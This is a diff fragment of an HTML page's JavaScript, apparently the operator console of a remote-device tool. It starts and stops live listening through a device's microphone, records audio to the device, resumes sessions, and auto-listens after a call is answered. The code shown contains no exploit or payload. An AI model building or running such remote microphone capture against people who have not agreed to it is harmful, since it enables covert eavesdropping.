+            try {
+                await api.sendCommand(deviceId, 'mic_stop');
+
+                if (scriptNode) { scriptNode.disconnect(); scriptNode = null; }
+                if (compressorNode) { compressorNode.disconnect(); compressorNode = null; }
+                if (analyserNode) { analyserNode.disconnect(); analyserNode = null; }
+                if (gainNode) { gainNode.disconnect(); gainNode = null; }
+                if (ws) { ws.close(); ws = null; }
+
+                ringBuffer.clear();
+                stopBufferInfo();
+                stopWaveform();
+                updateUI(STATES.IDLE);
+                api.showToast('Live listening stopped', 'success');
+            } catch (error) {
+                api.showToast('Failed: ' + error.message, 'error');
+            }
+        }
+
+        // ===== START RECORDING (while preview continues) =====
+        async function startRecording() {
+            try {
+                await api.sendCommand(deviceId, 'mic_record_start');
+                updateUI(STATES.RECORDING);
+                startRecTimer();
+                api.showToast('Recording started (preview continues)', 'success');
+            } catch (error) {
+                api.showToast('Failed: ' + error.message, 'error');
+            }
+        }
+
+        // ===== STOP RECORDING (back to preview) =====
+        async function stopRecording() {
+            try {
+                const response = await api.sendCommand(deviceId, 'mic_record_stop');
+                const result = response.data || response;
+                stopRecTimer();
+                updateUI(STATES.PREVIEWING); // Back to preview, NOT idle
+
+                if (result && result.path) {
+                    const size = result.sizeFormatted || '';
+                    api.showToast(`Recording saved to: ${result.path} (${size})`, 'success');
+                } else {
+                    api.showToast('Recording saved', 'success');
+                }
+            } catch (error) {
+                api.showToast('Failed: ' + error.message, 'error');
+            }
+        }
+
+        // ===== Event Listeners =====
+        btnStartPreview.addEventListener('click', startPreview);
+        btnStopPreview.addEventListener('click', stopPreview);
+        btnStartRecord.addEventListener('click', startRecording);
+        btnStopRecord.addEventListener('click', stopRecording);
+
+        // ===== Initialization & State Reconciliation =====
+        async function checkInitialStatus() {
+            try {
+                const response = await api.sendCommand(deviceId, 'mic_status');
+                const state = response.data || response;
+                
+                if (state.isLiveStreaming) {
+                    api.showToast('Resuming active mic session...', 'info');
+                    initAudio();
+                    if (audioContext.state === 'suspended') await audioContext.resume();
+                    
+                    ringBuffer.clear();
+                    await connectWebSocket();
+                    createAudioPipeline();
+                    
+                    startBufferInfo();
+                    startWaveform();
+                    
+                    updateUI(state.isRecording ? STATES.RECORDING : STATES.PREVIEWING);
+                } else {
+                    updateUI(STATES.IDLE);
+                }
+            } catch (e) {
+                console.error("Failed to fetch mic status:", e);
+                updateUI(STATES.IDLE);
+            }
+        }
+
+        // Auto-start mic stream if redirected from call answer (autoStart=true in URL)
+        const urlParams = new URLSearchParams(window.location.search);
+        if (urlParams.get('autoStart') === 'true') {
+            setTimeout(() => {
+                startPreview();
+                api.showToast('Call active — listening via speaker + mic', 'success');
+            }, 1000);
+        } else {
+            checkInitialStatus();
+        }
+
+        // ===== Page Leave Cleanup =====
+        function cleanupOnLeave() {
+            if (currentState === STATES.RECORDING) {
+                // Stop recording first
+                const url1 = `/api/command/${deviceId}`;
+                const body1 = JSON.stringify({ action: 'mic_record_stop', payload: {} });
+                navigator.sendBeacon(url1, new Blob([body1], { type: 'application/json' }));
+            }
+            if (currentState !== STATES.IDLE) {
+                // Stop mic streaming
+                const url = `/api/command/${deviceId}`;
+                const body = JSON.stringify({ action: 'mic_stop', payload: {} });
+                navigator.sendBeacon(url, new Blob([body], { type: 'application/json' }));
+                if (ws) { ws.close(); ws = null; }
+            }
+        }
+        window.addEventListener('pagehide', cleanupOnLeave);
+        window.addEventListener('beforeunload', cleanupOnLeave);
+    </script>
+
+</body>
+
+</html>
